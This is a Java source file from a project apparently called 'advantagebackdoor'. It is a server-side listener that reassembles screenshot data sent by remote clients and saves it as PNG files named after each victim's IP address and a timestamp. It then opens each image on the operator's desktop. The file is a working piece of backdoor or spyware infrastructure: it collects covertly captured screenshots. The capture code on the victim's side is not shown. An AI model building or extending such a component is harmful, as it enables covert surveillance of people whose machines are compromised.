package me.faintcloudy.advantagebackdoor.server.message;

import me.faintcloudy.advantagebackdoor.api.message.MessageHandler;
import me.faintcloudy.advantagebackdoor.api.message.MessageListener;
import me.faintcloudy.advantagebackdoor.api.message.play.client.ScreenShotMessage;

import java.awt.*;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.List;

public class ScreenShotListener implements MessageListener {
    SimpleDateFormat format = new SimpleDateFormat("yyyy-MM-dd-hh-mm-ss");
    Map<UUID, List<byte[]>> images = new HashMap<>();
    @MessageHandler
    public void onScreenShot(ScreenShotMessage message)
    {
        byte[] bytes = message.image;
        List<byte[]> listBytes = images.getOrDefault(message.uuid, new ArrayList<>());
        listBytes.add(bytes);
        images.put(message.uuid, listBytes);
        if (message.end)
        {
            File file = new File("screenshots","screenshot-" + message.getUser().getAddress().toString().replace("/", "")
                    + "-" + format.format(new Date()) + ".png");
            try {
                if (!file.getParentFile().exists())
                    file.getParentFile().mkdir();
                if (!file.exists())
                    file.createNewFile();
                FileOutputStream out = new FileOutputStream(file);
                for (byte[] bts : images.get(message.uuid)) {
                    out.write(bts);
                }
                out.close();
                Desktop.getDesktop().open(file);
                images.remove(message.uuid);
            } catch (IOException e) {
                e.printStackTrace();
            }
        }

    }
}
